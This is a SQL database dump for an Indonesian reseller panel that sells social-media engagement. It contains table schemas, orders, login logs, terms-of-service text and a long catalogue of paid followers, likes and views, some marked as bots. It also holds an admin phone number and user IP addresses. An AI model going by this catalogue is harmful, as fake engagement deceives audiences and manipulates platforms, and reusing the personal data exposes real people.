-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Waktu pembuatan: 17 Jan 2023 pada 06.07
-- Versi server: 10.4.24-MariaDB
-- Versi PHP: 7.4.29

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `jagososmed`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `balance_logs`
--

CREATE TABLE `balance_logs` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `type` varchar(5) COLLATE utf8_swedish_ci NOT NULL,
  `amount` double NOT NULL,
  `note` text COLLATE utf8_swedish_ci NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `balance_logs`
--

INSERT INTO `balance_logs` (`id`, `user_id`, `type`, `amount`, `note`, `created_at`) VALUES
(1, 1, 'minus', 2000, 'Membuat Pesanan. ID Pesanan: 1.', '2022-05-27 09:15:28'),
(2, 2, 'minus', 304, 'Membuat Pesanan. ID Pesanan: 1.', '2023-01-17 12:04:07');

-- --------------------------------------------------------

--
-- Struktur dari tabel `categories`
--

CREATE TABLE `categories` (
  `id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_swedish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `categories`
--

INSERT INTO `categories` (`id`, `name`) VALUES
(1, 'SoundCloud'),
(2, 'Telegram'),
(3, 'Instagram Story Views'),
(4, 'Instagram Live Video'),
(5, 'Instagram Story / Impressions / Saves / Profile Visit'),
(6, 'Twitter Views & Impressions'),
(7, 'Linkedin'),
(8, 'Website Traffic'),
(9, 'Youtube Views'),
(10, 'Instagram Views'),
(11, 'Spotify'),
(12, 'YouTube Shorts'),
(13, 'Facebook Page Likes & Page Followers'),
(14, 'Pinterest'),
(15, 'Shopee/Tokopedia/Bukalapak'),
(16, 'Instagram Likes'),
(17, 'Instagram Followers Indonesia'),
(18, 'Instagram Like Indonesia'),
(19, 'TikTok Followers'),
(20, 'TikTok Likes'),
(21, 'Youtube Likes / Dislikes / Shares / Comment'),
(22, 'Facebook Followers / Friends'),
(23, 'Facebook Post Likes / Comments / Shares'),
(24, 'Instagram Followers [ No Refill ]'),
(25, 'TikTok View'),
(26, 'Youtube Live Stream / Youtube Premiered Waiting'),
(27, 'Twitter Retweets'),
(28, 'Likee app'),
(29, 'Instagram Followers [guaranteed]'),
(30, 'Twitter Indonesia'),
(31, 'Youtube View Jam Tayang'),
(32, 'Instagram TV'),
(33, 'Youtube Subscribers'),
(34, 'Instagram Followers [ guaranteed 60 Hari - 99 Hari ] '),
(35, 'Instagram Comments'),
(36, 'TikTok  share'),
(37, 'Youtube Subscribers [ No Refill ]'),
(38, 'Instagram Followers [ guaranteed 180 Hari - Lifetime ]'),
(39, 'Clubhouse'),
(40, 'TikTok INDONESIA'),
(41, 'Instagram Reels'),
(42, 'Twitter Followers'),
(43, 'Youtube View  [ untuk monetisasi - penghasil duit ]'),
(44, 'Instagram VERIFIED '),
(45, 'Instagram Like Komentar [ top koment ]'),
(46, 'Facebook Video Views'),
(47, 'Twitter Favorites/Like'),
(48, 'Youtube View Target Negara'),
(49, 'Tiktok Comments '),
(50, 'Twitch'),
(51, 'Facebook Post Like Emoticon'),
(52, 'Facebook Reels Short Video'),
(53, 'Telegram Reactions'),
(54, 'TikTok Save/Favorit'),
(55, 'Tiktok Live Streams Like/Share/Comment'),
(56, 'Facebook Group Member'),
(57, 'Youtube Subscribers Negara'),
(58, 'YouTube Live Stream [ Harga Murah ] [ 30 Minutes to 24 Hours]'),
(59, 'Youtube Live Chat Comments [Live Stream / Premiere / Video Waiting To Be Published]'),
(60, 'YouTube Live Stream [ Harga Murah ] [ 30 Minutes to 24 Hours] Server 2 [ work ]'),
(61, 'TikTok Story'),
(62, 'YouTube Live Stream [ Harga Murah ] [ 30 Minutes to 24 Hours] Server 3 [ work ] '),
(63, 'Instagram AUTO LIKE INDONESIA'),
(64, '- PROMO - ON OFF'),
(65, 'Facebook Live Stream'),
(66, 'Twitter Tweet view'),
(67, 'Tiktok Live Streams');

-- --------------------------------------------------------

--
-- Struktur dari tabel `deposits`
--

CREATE TABLE `deposits` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `payment` enum('pulsa','bank','redeem') COLLATE utf8_swedish_ci NOT NULL,
  `type` enum('manual','auto') COLLATE utf8_swedish_ci NOT NULL,
  `method_name` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `post_amount` double NOT NULL,
  `amount` double NOT NULL,
  `note` text COLLATE utf8_swedish_ci NOT NULL,
  `phone` varchar(255) COLLATE utf8_swedish_ci DEFAULT NULL,
  `status` enum('Pending','Canceled','Success') COLLATE utf8_swedish_ci NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `deposit_methods`
--

CREATE TABLE `deposit_methods` (
  `id` int(11) NOT NULL,
  `payment` enum('pulsa','bank') COLLATE utf8_swedish_ci NOT NULL,
  `type` enum('manual','auto') COLLATE utf8_swedish_ci NOT NULL,
  `name` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `note` text COLLATE utf8_swedish_ci NOT NULL,
  `rate` double NOT NULL,
  `min_amount` double NOT NULL,
  `status` int(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `login_logs`
--

CREATE TABLE `login_logs` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `ip_address` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `login_logs`
--

INSERT INTO `login_logs` (`id`, `user_id`, `ip_address`, `created_at`) VALUES
(1, 1, '182.3.102.245', '2022-05-27 08:48:14'),
(2, 2, '::1', '2023-01-17 11:52:39');

-- --------------------------------------------------------

--
-- Struktur dari tabel `news`
--

CREATE TABLE `news` (
  `id` int(11) NOT NULL,
  `created_at` datetime NOT NULL,
  `content` text COLLATE utf8_swedish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `orders`
--

CREATE TABLE `orders` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `service_name` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `data` text COLLATE utf8_swedish_ci NOT NULL,
  `quantity` int(11) NOT NULL,
  `price` double NOT NULL,
  `profit` double NOT NULL,
  `start_count` int(11) NOT NULL DEFAULT 0,
  `remains` int(11) NOT NULL DEFAULT 0,
  `status` enum('Pending','Processing','Error','Partial','Success') COLLATE utf8_swedish_ci NOT NULL,
  `provider_id` int(11) NOT NULL,
  `provider_order_id` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `is_api` int(1) NOT NULL DEFAULT 0,
  `is_refund` int(1) NOT NULL DEFAULT 0,
  `created_at` datetime NOT NULL,
  `updated_at` datetime DEFAULT NULL,
  `api_order_log` text COLLATE utf8_swedish_ci DEFAULT NULL,
  `api_status_log` text COLLATE utf8_swedish_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `orders`
--

INSERT INTO `orders` (`id`, `user_id`, `service_name`, `data`, `quantity`, `price`, `profit`, `start_count`, `remains`, `status`, `provider_id`, `provider_order_id`, `is_api`, `is_refund`, `created_at`, `updated_at`, `api_order_log`, `api_status_log`) VALUES
(1, 2, 'Instagram Followers Server 8 [ Refill 180days ] [ 30-50k/day] ( Recommended Service )', 'kdshkasdhkshkajhdajshjk', 10, 304, 152, 0, 10, 'Pending', 1, '3461', 0, 0, '2023-01-17 12:04:07', NULL, '\n{\n    \"status\": true,\n    \"data\": {\n        \"id\": 3461\n    }\n}', NULL);

-- --------------------------------------------------------

--
-- Struktur dari tabel `pages`
--

CREATE TABLE `pages` (
  `id` int(11) NOT NULL,
  `content` text COLLATE utf8_swedish_ci NOT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `pages`
--

INSERT INTO `pages` (`id`, `content`, `updated_at`) VALUES
(1, 'ðŸ‘‰ Informasi Admin ðŸ‘ˆ\r\nðŸ… Nama: ADAM SMM\r\nðŸ“ž 081218643662\r\nâ° Fast Respon: 08.00-16.00', '2019-03-20 10:18:14'),
(2, 'Syarat & Ketentuan ADAM SMM telah ditetapkan kesepakatan-kesepakatan berikut.\r\n\r\n1. UMUM\r\n\r\nDengan mendaftar dan menggunakan layanan Youtube secara otomatis anda menyetujui semua ketentuan yang kami buat. Ketentuan bisa saja berubah sewaktu-waktu tanpa pemberitahuan terlebih dahulu.\r\n\r\n2. LAYANAN\r\n\r\nADAM SMM hanya untuk sarana promosi. Hanya untuk membatu meningkatkan \"penampilan\" Akun sosial media anda.\r\nADAM SMM tidak dapat memastikan pengikut baru anda akan berinteraksi dengan anda.\r\nADAM SMM hanya menjamin anda akan mendapatkan pengikut sesuai yang anda bayar.\r\nADAM SMM tidak menjamin 100% dari akun kami memiliki gambar profil atau bio yang lengkap.\r\nADAM SMM tidak akan mengembalikan saldo jika anda salah memesan. Pastikan anda memasukan data yang benar sebelum memesan layanan.\r\nADAM SMM Anda Tidak Dapat Melakukan Pemesanan Untuk Hal Yang Bersifat Melanggar Hukum.\r\nADAM SMM Tidak Menjamin Semua Layanan Dapat Bertahan Selamanya.\r\n\r\n3. TANGGUNG JAWAB\r\n\r\nADAM SMM sama sekali tidak bertanggung jawab atas kerugian yang mungkin terjadi pada bisnis anda.\r\nADAM SMM tidak bertanggung jawab jika terjadi penanguhan akun,penghapusan foto atau video atau bahkan pembokiran akun sosial media anda.\r\nADAM SMM tidak bertanggung jawab atas penyalahgunaan layanan yang kami sediakan.\r\nADAM SMM di bebaskan dari segala tuntutan hukum.\r\n\r\n4. HARGA\r\n\r\nHarga yang kami tawarkan dapat berubah sewaktu-waktu. Dengan pemberitahuan atau tanpa pemberitahuan.\r\n\r\n5. PEMESANAN\r\n\r\nPesanan yang sudah di input tidak dapat di batalkan.\r\nWaktu pengerjaan yang kami lampirkan di diskripsi hanyalah perkiraan.\r\n\r\n6. SALDO\r\n\r\nTidak ada pengembalian uang yang akan dilakukan ke metode pembayaran Anda. Setelah deposit selesai, tidak ada cara untuk mengembalikannya. Anda harus menggunakan saldo Anda atas perintah dari Youtube.\r\nAnda setuju bahwa setelah Anda menyelesaikan pembayaran, Anda tidak akan mengajukan sengketa atau tagihan balik kepada kami karena alasan apa pun.\r\n\r\n7. AKUN\r\n\r\nKami tidak akan membantu apapun yang terjadi pada akun anda jika data yang anda inputkan saat pendaftaran tidak sesuai dengan kriteria yang telah kami sarankan.\r\nJika Anda melakukan pendaftaran dan tidak melakukan deposit atau pengisian saldo dalam waktu lebih dari 1 hari maka akun Anda otomatis akan dinonaktifkan oleh sistem. Jika Anda terbukti melakukan kecurangan dalam bertransaksi di Youtube maka kami akan menonaktifkan atau bisa saja menghapus akun Anda dari website kami.', '2019-03-20 00:00:00'),
(3, '1. Apa itu ADAM SMM?\r\nADAM SMM adalah sebuah platform bisnis yang menyediakan berbagai layanan sosial media marketing yang bergerak terutama di Indonesia. Dengan bergabung bersama kami, Anda dapat menjadi penyedia jasa sosial media atau reseller social media seperti jasa penambah Followers, Likes, dll.\r\n\r\n2. Bagaimana cara mendaftar di Youtube?\r\nAnda dapat langsung mendaftar di website Youtube pada halaman Daftar\r\n\r\n3. Bagaimana cara membuat pesanan?\r\nUntuk membuat pesanan sangatlah mudah, Anda hanya perlu masuk terlebih dahulu ke akun Anda dan menuju halaman pemesanan dengan mengklik menu yang sudah tersedia. Selain itu Anda juga dapat melakukan pemesanan melalui request API.\r\n\r\n4. Bagaimana cara melakukan deposit/isi saldo?\r\nUntuk melakukan deposit/isi saldo, Anda hanya perlu masuk terlebih dahulu ke akun Anda dan menuju halaman deposit dengan mengklik menu yang sudah tersedia. Kami menyediakan deposit melalui bank dan pulsa.', '2019-03-20 00:00:00');

-- --------------------------------------------------------

--
-- Struktur dari tabel `provider`
--

CREATE TABLE `provider` (
  `id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `api_url_order` text COLLATE utf8_swedish_ci NOT NULL,
  `api_url_status` text COLLATE utf8_swedish_ci NOT NULL,
  `api_key` varchar(255) COLLATE utf8_swedish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `provider`
--

INSERT INTO `provider` (`id`, `name`, `api_url_order`, `api_url_status`, `api_key`) VALUES
(1, 'JAGOSOSMED', 'https://www.jagososmed.com/api/json.php', 'https://www.jagososmed.com/api/json.php', 'AMBIL API KEY DI WWW.JAGOSOSMED.COM');

-- --------------------------------------------------------

--
-- Struktur dari tabel `register_logs`
--

CREATE TABLE `register_logs` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `ip_address` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `register_logs`
--

INSERT INTO `register_logs` (`id`, `user_id`, `ip_address`, `created_at`) VALUES
(1, 1, '182.3.102.245', '2022-05-27 08:47:47'),
(2, 2, '::1', '2023-01-17 11:52:14');

-- --------------------------------------------------------

--
-- Struktur dari tabel `services`
--

CREATE TABLE `services` (
  `id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  `service_name` varchar(255) COLLATE utf8_swedish_ci NOT NULL,
  `note` text COLLATE utf8_swedish_ci NOT NULL,
  `min` int(11) NOT NULL,
  `max` int(11) NOT NULL,
  `price` double NOT NULL,
  `profit` double NOT NULL,
  `status` int(1) NOT NULL DEFAULT 1,
  `provider_id` int(11) NOT NULL,
  `provider_service_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_swedish_ci;

--
-- Dumping data untuk tabel `services`
--

INSERT INTO `services` (`id`, `category_id`, `service_name`, `note`, `min`, `max`, `price`, `profit`, `status`, `provider_id`, `provider_service_id`) VALUES
(1, 1, 'SoundCloud Plays [1.5M]', 'Real\n0-1 Hour Start!\n50K - 100K/Day\nMultiple of 100\nMinimum 100', 100, 1500000, 3800, 1900, 1, 1, 8374),
(2, 1, 'SoundCloud Plays [10M]', 'Real\n0-1 Hour Start!\n10K - 100K/Day\nMinimum 20', 20, 10000000, 5700, 2850, 1, 1, 8375),
(3, 1, 'Soundcloud - Likes ( S1 ) [ HQ ] ( INSTANT )', 'HQ Users, Non Drop. Order Will Be Start Instant.', 20, 40000, 76000, 38000, 1, 1, 8376),
(4, 2, 'Telegram Post Views [10K] [Last 5]', 'Views Will Be Added To Your Last 5 Posts\nReal\n0-1 Hour Start!\n24 Hours Delivery\nMinimum 100', 100, 10000, 57000, 28500, 1, 1, 8377),
(5, 3, 'Instagram Story Views [20K] [LAST STORY ONLY]', 'Views On The Last Story Posted ONLY !\nUsername Only\n0-1 Hour Start!\nUltra Fast!\nMinimum 20', 20, 20000, 10640, 5320, 1, 1, 8378),
(6, 4, 'Instagram Live Video Likes ', 'Username Only\nNo Refill / No Refund\nLikes On Live Video\nFast Delivery\nMinimum 200', 200, 10000, 22800, 11400, 1, 1, 8379),
(7, 4, 'Instagram - Live Video Views', '[ Username Only ] INSTANT', 25, 100000, 285000, 142500, 1, 1, 8380),
(8, 5, 'Instagram Impressions [10M] [EXPLORE - HOME - LOCATION - PROFILE]', 'Impressions showing from ALL in the statistics (Explore, Home, Location ,Etc..)!\nInstant Start!\nFast Delivery!\nMinimum 100\nMaximum 10M', 100, 20000000, 7220, 3610, 1, 1, 8381),
(9, 5, 'Instagram Impressions [1M]', 'Real\nInstant Delivery!\nMinimum 100', 100, 1000000, 5700, 2850, 1, 1, 8382),
(10, 5, 'Instagram Saves ', 'No Refill / No Refund\n0-1 Hour Start!\n15K/Day\nMinimum 10', 10, 15000, 15200, 7600, 1, 1, 8383),
(11, 6, 'Twitter Views Server 1 [1M]', 'Refill (30 Days Maximum) \n0-1 Hour Start! \n10K - 100K/Day \nMinimum 100', 100, 1000000, 38000, 19000, 1, 1, 8384),
(12, 7, 'Linkedin - Followers AUTO 1', 'instan', 100, 1000, 273600, 136800, 1, 1, 8385),
(13, 8, 'Website Traffic Server 2 [10M]', 'Super Cepat', 100, 10000000, 15200, 7600, 1, 1, 8386),
(14, 2, 'Telegram - Channnel Members [ Max 3K]', 'Channel Only\n5k/day\nNo Refill\n1-12hrs start\nMin 100, Max 100k', 100, 3000, 51300, 25650, 1, 1, 8387),
(15, 9, 'Youtube Views server 1 [ No Garansi ][ Fast ] ', 'Instan\nkecepatan 5k -20k/hari\nGK ADA GARANSI APAPUN! JIKA VIEW TURUN\nBELI? berani ambil resiko', 1000, 100000, 27512, 13756, 1, 1, 8388),
(16, 10, 'instagram view Server 2 [ Max - 500Juta ] ', 'INSTANT', 100, 500000000, 68.4, 34.2, 1, 1, 8389),
(17, 11, 'Spotify Followers S1 [1M] min 1000', 'Start Time: Instant - 6 hours\nSpeed: 20K/ day \nRefill: no', 1000, 1000000, 104500, 52250, 1, 1, 8390),
(18, 11, 'Spotify Followers S2 [1M] min 20', 'Start Time: Instant - 6 hours\nSpeed: 20K/ day \nRefill: no', 20, 1000000, 167200, 83600, 1, 1, 8391),
(19, 11, 'Spotify Followers S3 [Super Fast] min 20', '100% High-Quality Account\nNo Drop - Life Time Guarantee\nInstant ( Avg 0-3 hrs ) \n500 to 5000 per 24 hour', 20, 1000000, 102600, 51300, 1, 1, 8392),
(20, 11, 'Spotify Plays S1', 'Spotify Plays S1', 1000, 1000000, 70300, 35150, 1, 1, 8393),
(21, 11, 'Spotify Playlists S1', 'Correct format: \nhttps://open.spotify.com/album/2beOdusX0eDgXQ7KdX8IVf\nhttps://open.spotify.com/playlist/4jHJBBSbRZp2SNFeHoJMfA', 50, 100000, 342000, 171000, 1, 1, 8394),
(22, 11, 'Spotify Playlists S2', 'Correct format: \nhttps://open.spotify.com/album/2beOdusX0eDgXQ7KdX8IVf\nhttps://open.spotify.com/playlist/4jHJBBSbRZp2SNFeHoJMfA', 5000, 1000000, 83600, 41800, 1, 1, 8395),
(23, 12, 'Youtube Short Views Server 4 [ 50k-100k/day ] [ Lifetime Guarantee ] cheap', 'Start time: 0-3 hours\nJika status selesai tetapi view tidak ter update\nsilahkan klik like', 100, 10000000, 41800, 20900, 1, 1, 8396),
(24, 13, 'Facebook Page Likes [ S 8 ] [20K] [R30]', 'Start Time: Instant - 1 hour\nSpeed: 5K/ day \nRefill: 30 days\nSpecs: Fast', 50, 20000, 159600, 79800, 1, 1, 8397),
(25, 14, 'Pinterest Board Followers ', 'Pinterest Board Followers', 20, 5000, 148200, 74100, 1, 1, 8398),
(26, 14, 'Pinterest Likes ', 'Pinterest Likes', 22, 250000, 144400, 72200, 1, 1, 8399),
(27, 3, 'Instagram Story Views [9K] [1H - Ultra Fast! ]', 'NO REFILL\n\njika ada masalah view tidak masuk\nkirimkan bukti ss nya yang ada tanggal dan waktu nya', 250, 3000, 7600, 3800, 1, 1, 8400),
(28, 4, 'Instagram Live Video Comments Random', 'Username Only \nNo Refill / No Refund \nRandom Comments On Live Video \nFast Delivery \nMinimum 50', 100, 2000, 380000, 190000, 1, 1, 8401),
(29, 15, 'Tokopedia Views Produk', 'Gunakan Link feed produk', 50, 10000, 7600, 3800, 1, 1, 8402),
(30, 5, 'Instagram kunjungan profil / Profile Visit', 'Profile Visit', 100, 100000, 28500, 14250, 1, 1, 8403),
(31, 15, 'Tokopedia wishlist/ Favorite [ max 2k ]', 'gunakan link Produk', 50, 2000, 30400, 15200, 1, 1, 8404),
(32, 15, 'Shopee Followers [30K] MURAH [BONUS 5%]', 'Gunakan username ya bro jangan link!\ninstan\norder 100 dapat 105', 50, 30000, 57000, 28500, 1, 1, 8405),
(33, 9, 'Youtube Ranking Views V10 [ Recommended ][ 0 - 1 Mint Retention]', '[ Lifetime Guarantee Views ]\n- Cheapest In Market\n- Start times : 0 - 1h ( Instant )\n- Non drop - Lifetime Guarantee Views\n- Speed 20k - 30k+ ( Some times will be Faster )\n- Retention : 0-1 Minutes +', 500, 10000000, 93100, 46550, 1, 1, 8406),
(34, 16, 'Instagram Likes Server 3 [ Kualitas bagus ] [ Superfast ] ', 'fast', 10, 25000, 60800, 30400, 1, 1, 8407),
(35, 15, 'Shopee Likes Indonesia Server new [1500] {produk} ', 'bot\ngunakan link\nContoh : https://shopee.co.id/Rok-Midi-A-Line-Lipit-Bahan-Tulle-Warna-Polos-untuk-Wanita-i.29961905.1125996814\njangan pakai smttt\nCONTOH LINK SALAH :\n1. https://shopee.co.id/product/xxxxxx/xxxxxxxx?smtt=0.0.9\n2. https://shopee.co.id/product/xxxxxx/xxxxxxxx/?smtt=0.0.9\nTolong gunakan link yang benar !', 50, 1500, 11400, 5700, 1, 1, 8408),
(36, 17, 'Instagram Followers Indonesia Server 2 [REFILL 30 HARI]', 'MIX ada akun luar\njika dalam 30 hari drop rate lebih dari 40% itu Bisa refill\nRefill hanya bisa sekali\ndrop di bawah 40% gk bisa di refill', 10, 10000, 228000, 114000, 1, 1, 8409),
(37, 11, 'Spotify Plays [ 1M ] Speed : 500 - 3500/D', '- Start Time: 1 - 12 Hours\n- Speed : 500 - 3500/D\n- Refill : Non Drop - LifeTime Guarantee\n- Best Service in the Market\n- Followers from TIER 1 countries only! USA/CA/EU/AU/NZ/UK.\n- Quality: HQ\n- Min/Max: 1000/1M', 1000, 1000000, 34200, 17100, 1, 1, 8410),
(38, 18, 'Instagram Likes Indonesia Server 3 max 2K [ MAX TERBESAR DAN TERMURAH ] ', '24 jam proses\nbisa lebih lama jika antrian panjang\nsemakin besar jumlah yang dipesan semakin cepat diproses\nKualitas Real + BOT HQ\nJANGAN PERNAH DOUBLE ORDER\nHANYA MAX 1K!\nsukses no refund', 100, 1000, 11400, 5700, 1, 1, 8411),
(39, 19, 'TIK TOK FOLLOWERS S4 [ 30 days refill - Full URL ]⚡️⚡️⚡️', 'Complete URL \n30 days refill\nSpeed 2-5k/Day', 10, 15000, 437000, 218500, 1, 1, 8412),
(40, 20, 'TIK TOK Likes S5 [ 30 days refill - Full URL ] ', 'Complete URL \n30 days refill\nSpeed 2-5k/Day', 10, 15000, 437000, 218500, 1, 1, 8413),
(41, 21, 'Youtube Like [ S6 ] [ TERMURAH Instant  ][ R30 ] FAST', '- Instant\n- 30 days refill\nStart Time 0-1 hours', 50, 100000, 50160, 25080, 1, 1, 8414),
(42, 9, 'Youtube Views Server 4 ( No refill ) [Speed: 500K/Day] CHEAP', '- Start : 0 - 6 jam', 1000, 10000000, 26980, 13490, 1, 1, 8415),
(43, 3, 'Instagram - Story Views S3 All Story Views Fast ', 'instan\njika ada masalah view tidak masuk\nkirimkan bukti ss nya yang ada tanggal dan waktu nya', 100, 40000, 5320, 2660, 1, 1, 8416),
(44, 15, 'Tokopedia Feeds Comment', '-', 5, 2000, 1330000, 665000, 1, 1, 8417),
(45, 13, 'Facebook Page Likes [ S 11 ] [Refill 30] [Instant Start] Real', 'Refill 30 Days\nInstant Start\nSpeed : 5K / Day\nNon Drop Likes', 100, 10000, 646000, 323000, 1, 1, 8418),
(46, 15, 'Shopee Followers Server 2 NEW [2500] NODROP ', 'instan', 100, 2500, 34200, 17100, 1, 1, 8419),
(47, 19, 'TIK TOK FOLLOWERS S5 [ 30 days refill - Full URL ]  ⚡️⚡️⚡️', '- Speed 5000 per day\n- Avatars Followers and Likes\n- 30 days warranty\n- instant start to 5 minute start Time\n( Contoh Target yang kamu masukin https://www.tiktok.com/@username )', 10, 30000, 304000, 152000, 1, 1, 8420),
(48, 20, 'TIK TOK Likes S6 [ 30 days refill - Full URL ] ', '- Speed 5000 per day\n- Avatars Followers and Likes\n- 30 days warranty\n- instant start to 5 minute start Time', 9, 30000, 323000, 161500, 1, 1, 8421),
(49, 16, ' Instagram Likes MP 2 [No Drop] Real [Max 5K]', 'Speed : 200 Likes / Hour\nNo Partial Issues\nNo Drop', 20, 5000, 28500, 14250, 1, 1, 8422),
(50, 16, 'Instagram Likes MP 3 [ 10k ] [ Instant - Start ]', 'Start time:\nFor orders under 1000 likes usually instant. If more than 1000 - may take some time, usually few hours\nSpeed is up to 100-200 per hour (can lower a bit when many orders)\nNo cancellation before 24 hours', 20, 5000, 91200, 45600, 1, 1, 8423),
(51, 9, 'Youtube Ranking Desktop Views MP 2 [ Lifetime Guaranteed ]', '0-24 hour start time\n100k to 300k /day speed\nLifetime refill guarantee\n30-40 second watch time\nSafe to run with monetised videos\nWindows desktop watch page\nWorldwide viewers added in a non-stop natural pattern\nMust be unrestricted & open for all countries\nOK for VEVO\nIncremental Speed Based on Order Size\n500 Minimum order\n1 Million Maximum order', 500, 1000000, 91200, 45600, 1, 1, 8424),
(52, 22, 'Facebook Profile Follower MP 1 [ No Refill ] beta test ', '- Speed 1k/D\n- Start : 0 - 24h\n- hanya untuk followers profil ya bukan fanspage/halaman !\n- No Refill .', 100, 10000, 353400, 176700, 1, 1, 8425),
(53, 23, 'Facebook Photo / Post Likes MP1[ Start Instant ][Recommended]', 'Speed 5k per day\nNo refill\nbisa untuk video live', 25, 10000, 209000, 104500, 1, 1, 8426),
(54, 21, 'Youtube Like MP 3 [ 30 Days Refill - Max 5K ] [ Speed 100+/D ]', '- Start : 0 - 24 hours\n- Min: 50 - Max: 5K\n- Daily speed 50 - 200 ( Speed can slower if server overload, in this care must wait )\n- NON DROP so far - 30 days Refill Guarantee\n\nNOTE :\n- No Refund after order placed\n- No Refill if Old Likes Drop Below Start Count .', 50, 10000, 114000, 57000, 1, 1, 8427),
(55, 21, 'Youtube Like MP 4 [ TERMURAH ][ R30 - 10K ][ 200+/D ]♻️', '- Instant\n- Non drop -\n- Guarantee: 30 days refill if any drop\n- Speed 200+/D', 20, 10000, 254600, 127300, 1, 1, 8428),
(56, 21, 'Youtube Like MP 5 [ TERMURAH ][ NO REFILL- 10K ][ 10K+/D ]', '- Instant Start\n- Speed for now about 10K/D\n- No refill / No refund with any reason .', 20, 10000, 186200, 93100, 1, 1, 8429),
(57, 1, 'Soundcloud  Followers MP 1 [ High Quality ] ~ Instant ', '[ High Quality ] ~ Instant\n', 20, 25000, 83600, 41800, 1, 1, 8430),
(58, 2, 'Telegram Post Views [10K] [Last 1] ', 'Start Time: Instant - 1 hour\nSpeed: 10K to 20K/ day\nRefill: no\nSpecs: Latest Post\nSend Post Link Or channel id\nExample Link: https://t.me/link_example/994', 100, 200000, 5700, 2850, 1, 1, 8431),
(59, 21, 'Youtube Like MP 5 [ Best Price in Market ][ 30 Days refill ]', 'Speed 200-400 Per Day\nRefill: 30 Days\nStart Time 0-2 hours', 50, 15000, 47120, 23560, 1, 1, 8432),
(60, 24, 'Instagram Followers MP 31 [ LESS DROP | DROP 10-20% ] ', '1k in 1 minutes\n80% real\nKemungkinan drop 10-20% jika anda memesan 1000+\n', 100, 5000, 114000, 57000, 1, 1, 8433),
(61, 16, 'Instagram Likes MP 9 [ Pakistan+asia+indo ] [ 40K ] ', '1k-2k/hour\n', 50, 40000, 40280, 20140, 1, 1, 8434),
(62, 2, 'Telegram Channnel Members [ Max 10K] ', 'Instant\nSpeed: 1-5K day\nBisa Req Cancelled\nNo guaranteed', 10, 10000, 23560, 11780, 1, 1, 8435),
(63, 21, 'Youtube Like MP 6 [ Best Seller ][ AUTO Refill ]♻️', 'Instant\n30 days refill\nSpeed 200+/hari', 20, 10000, 152000, 76000, 1, 1, 8436),
(64, 24, 'Instagram Followers MP 33 [ NON DROP | BONUS 0-5% ] [ 2k/Day ]⚡️', 'waktu proses 0-1jam\nkecepatan 1k-3k/hari\nno drop\nkalo drop kemungkinan besar itu followers yang lain, bukan dari kami\nkalo drop kemungkinan sangat dikit dan no refill', 50, 100000, 456000, 228000, 1, 1, 8437),
(65, 25, 'TIKTOK View S9 [ superfast ] [ Trending + Viral Views]', 'Layanan ini berbeda dengan view lain\nkarena layanan ini bisa membuat trending dan viral video', 500, 500000, 7220, 3610, 1, 1, 8438),
